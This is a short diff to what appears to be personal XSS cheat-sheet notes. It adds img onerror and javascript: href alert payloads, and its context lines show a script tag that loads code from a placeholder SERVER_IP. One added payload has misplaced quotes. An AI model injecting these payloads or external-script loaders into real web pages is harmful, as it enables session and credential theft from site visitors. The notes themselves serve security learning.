@@ -103,6 +103,16 @@ Make the victim's browser request a page on your server
 <script src='http://<SERVER_IP>/test'></script>
 ```
 
+Insert JavaScript code into HTML code as an attribute to the current tag
+```HTML
+<img src="example.com" onerror="alert('XSS');">
+```
+```HTML
+<a href="javascript:alert('XSS')>Click me</a>"
+```
+
+
+
 ![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/Whitespace.png)
 
 # XSS Polygot
